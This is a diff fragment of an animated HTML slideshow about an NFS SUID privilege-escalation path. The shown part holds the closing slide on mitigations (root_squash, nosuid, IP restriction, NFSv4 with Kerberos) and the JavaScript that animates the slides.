+        <svg width="100%" height="100" viewBox="0 0 366 100" xmlns="http://www.w3.org/2000/svg">
+          <text x="10" y="22" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">root_squash</text>
+          <rect x="115" y="12" width="0" height="11" fill="#4eff9a" id="bar1"/>
+          <text id="bar1pct" x="122" y="22" font-size="5.5" fill="#4eff9a" font-family="'Press Start 2P',monospace" opacity="0">90%</text>
+
+          <text x="10" y="44" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">IP restrict</text>
+          <rect x="115" y="34" width="0" height="11" fill="#4ec9e1" id="bar2"/>
+          <text id="bar2pct" x="122" y="44" font-size="5.5" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">70%</text>
+
+          <text x="10" y="66" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">nosuid</text>
+          <rect x="115" y="56" width="0" height="11" fill="#a080ff" id="bar3"/>
+          <text id="bar3pct" x="122" y="66" font-size="5.5" fill="#a080ff" font-family="'Press Start 2P',monospace" opacity="0">75%</text>
+
+          <text x="10" y="88" font-size="6" fill="#666" font-family="'Press Start 2P',monospace">NFSv4+krb5</text>
+          <rect x="115" y="78" width="0" height="11" fill="#e8a020" id="bar4"/>
+          <text id="bar4pct" x="122" y="88" font-size="5.5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">98%</text>
+        </svg>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info gn">
+    <div class="il">root_squash + nosuid + IP restriction eliminates this attack path entirely.</div>
+    <div class="ih">NFSv4 + Kerberos removes UID trust from the equation — cryptographic identity only.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv gn">4</div><div class="sl">CONTROLS<br>AVAIL</div></div>
+    <div class="sc"><div class="sv gn">nosuid</div><div class="sl">CLIENT<br>SAFEGUARD</div></div>
+    <div class="sc"><div class="sv am">krb5</div><div class="sl">GOLD<br>STANDARD</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(3)">◀ PREV</button>
+    <button class="btn play" onclick="play(4)">▶ PLAY</button>
+    <button class="btn restart" onclick="go(1)">↩ RESTART</button>
+  </div>
+</div>
+
+</div>
+<script>
+let cur = 1, T = [];
+function clr() { T.forEach(t => clearTimeout(t)); T = []; }
+function af(ms, fn) { T.push(setTimeout(fn, ms)); }
+
+function show(id, ms) {
+  af(ms, () => {
+    const e = document.getElementById(id);
+    if (e) { e.style.opacity = '1'; e.classList.add('vis'); }
+  });
+}
+function hide(id) {
+  const e = document.getElementById(id);
+  if (e) { e.style.opacity = '0'; e.classList.remove('vis'); }
+}
+function showEl(id, ms) { af(ms, () => { const e = document.getElementById(id); if (e) e.style.opacity = '1'; }); }
+function hideEl(id) { const e = document.getElementById(id); if (e) e.style.opacity = '0'; }
+function svgShow(id, ms) { af(ms, () => { const e = document.getElementById(id); if (e) e.setAttribute('opacity','1'); }); }
+function svgHide(id) { const e = document.getElementById(id); if (e) e.setAttribute('opacity','0'); }
+
+function animBar(id, labelId, targetW, ms) {
+  af(ms, () => {
+    const bar = document.getElementById(id);
+    const lbl = document.getElementById(labelId);
+    if (!bar) return;
+    bar.style.transition = 'width .6s ease';
+    bar.style.width = targetW + 'px';
+    if (lbl) { lbl.setAttribute('opacity','1'); lbl.setAttribute('x', 115 + targetW + 4); }
+  });
+}
+
+function movePkt(id, x1, y1, x2, y2, startMs, durMs) {
+  af(startMs, () => {
+    const d = document.getElementById(id); if (!d) return;
+    d.setAttribute('cx', x1); d.setAttribute('cy', y1); d.setAttribute('opacity','1');
+    const frames = Math.max(1, Math.round(durMs / 16)); let f = 0;
+    function step() {
+      f++; const p = Math.min(f / frames, 1);
+      d.setAttribute('cx', x1 + (x2 - x1) * p);
+      d.setAttribute('cy', y1 + (y2 - y1) * p);
+      if (f < frames) af(16, step); else d.setAttribute('opacity','0');
+    }
+    af(16, step);
+  });
+}
+
+function go(n) {
+  clr();
+  const prev = document.getElementById('s' + cur);
+  const next = document.getElementById('s' + n);
+  const fwd = n > cur;
+  next.style.transition = 'none';
+  next.style.transform = fwd ? 'translateX(100%)' : 'translateX(-100%)';
+  next.offsetHeight;
+  next.style.transition = 'transform .35s cubic-bezier(.4,0,.2,1)';
+  prev.style.transition = 'transform .35s cubic-bezier(.4,0,.2,1)';
+  prev.style.transform = fwd ? 'translateX(-100%)' : 'translateX(100%)';
+  next.style.transform = 'translateX(0)';
+  prev.classList.remove('active');
+  next.classList.add('active');
+  cur = n;
+  reset(n);
+  af(80, () => play(n));
+}
+
+function reset(n) {
+  if (n === 1) {
+    ['abox','aico','atxt','auid','arr1','arh1','artxt','artxt2',
+     'sbox','sico','stxt','sport','sport2','sport3',
+     'expbx','expt1','expt2','expln','pkt1','smtxt'].forEach(id => svgHide(id));
+    hide('smterm'); hide('expbox');
+    ['sml1','sml2','sml3','sml4'].forEach(id => hideEl(id));
+  }
+  if (n === 2) {
+    hide('suidbox'); hide('mntterm'); hide('cpterm'); hide('ftdiag');
+    ['ml1','ml2','cl1','cl2','cl3','cl4','cl5'].forEach(id => hideEl(id));
+    ['f1','f1t','f1t2','fa','fah','fatxt','fatxt2','f2','f2t','f2t2','f2t3',
+     'fa2','fah2','f3','f3t','f3t2','fpkt'].forEach(id => svgHide(id));
+  }
+  if (n === 3) {
+    hide('victerm'); hide('rootterm'); hide('uiddiag');
+    ['vl1','vl2','vl3','vl4','vl5','vl6',
+     'rl1','rl2','rl3','rl4','rl5','rl6','rl7'].forEach(id => hideEl(id));
+  }
+  if (n === 4) {
+    hide('cmpbox'); hide('fix1'); hide('fix2'); hide('fix3'); hide('fix4'); hide('sumbox');
+    ['bar1','bar2','bar3','bar4'].forEach(id => {
+      const e = document.getElementById(id);
+      if (e) { e.style.transition = 'none'; e.style.width = '0px'; }
+    });
+    ['bar1pct','bar2pct','bar3pct','bar4pct'].forEach(id => svgHide(id));
+  }
+}
+
+function play(n) {
+  clr();
+  if (n === 1) {
+    // Server + exports
+    svgShow('sbox', 200); svgShow('sico', 280); svgShow('stxt', 350);
+    svgShow('sport', 400); svgShow('sport2', 450); svgShow('sport3', 500);
+    svgShow('expbx', 600); svgShow('expt1', 660); svgShow('expt2', 720); svgShow('expln', 650);
+    // Arrow + attacker
+    svgShow('arr1', 900); svgShow('arh1', 950); svgShow('artxt', 980); svgShow('artxt2', 1020);
+    svgShow('abox', 1100); svgShow('aico', 1160); svgShow('atxt', 1220); svgShow('auid', 1280);
+    // Packet traveling
+    movePkt('pkt1', 94, 80, 178, 80, 1500, 450);
+    movePkt('pkt1', 94, 80, 178, 80, 2200, 450);
+    svgShow('smtxt', 1900);
+    // Showmount terminal
+    show('smterm', 2400);
+    showEl('sml1', 2800); showEl('sml2', 3100);
+    showEl('sml3', 3500); showEl('sml4', 3900);
+    // Exports explainer
+    show('expbox', 4400);
+  }
+
+  if (n === 2) {
+    show('suidbox', 200);
+    // Mount step
+    show('mntterm', 1000);
+    showEl('ml1', 1400); showEl('ml2', 1800);
+    // Copy + chmod step
+    show('cpterm', 2200);
+    showEl('cl1', 2600); showEl('cl2', 3000);
+    showEl('cl3', 3400); showEl('cl4', 3700); showEl('cl5', 4100);
+    // SVG flow diagram
+    show('ftdiag', 4500);
+    svgShow('f1', 4700); svgShow('f1t', 4800); svgShow('f1t2', 4900);
+    svgShow('fa', 5000); svgShow('fah', 5050); svgShow('fatxt', 5100); svgShow('fatxt2', 5150);
+    // Packet
+    movePkt('fpkt', 92, 38, 158, 38, 5300, 500);
+    svgShow('f2', 5800); svgShow('f2t', 5900); svgShow('f2t2', 5960); svgShow('f2t3', 6020);
+    svgShow('fa2', 6200); svgShow('fah2', 6250);
+    svgShow('f3', 6400); svgShow('f3t', 6450); svgShow('f3t2', 6500);
+  }
+
+  if (n === 3) {
+    show('victerm', 200);
+    showEl('vl1', 600); showEl('vl2', 1000);
+    showEl('vl3', 1400); showEl('vl4', 1800);
+    showEl('vl5', 2300); showEl('vl6', 2700);
+    show('rootterm', 3200);
+    showEl('rl1', 3600); showEl('rl2', 4000);
+    showEl('rl3', 4400); showEl('rl4', 4900);
+    showEl('rl5', 5400); showEl('rl6', 5900); showEl('rl7', 6400);
+    show('uiddiag', 7000);
+  }
+
+  if (n === 4) {
+    show('cmpbox', 200);
+    show('fix1', 900);
+    show('fix2', 1700);
+    show('fix3', 2500);
+    show('fix4', 3300);
+    show('sumbox', 4100);
+    animBar('bar1', 'bar1pct', 152, 4400);
+    animBar('bar2', 'bar2pct', 118, 4600);
+    animBar('bar3', 'bar3pct', 127, 4800);
+    animBar('bar4', 'bar4pct', 165, 5000);
+  }
+}
+
+window.addEventListener('load', () => { af(150, () => play(1)); });
+</script>
+</body>
+</html>
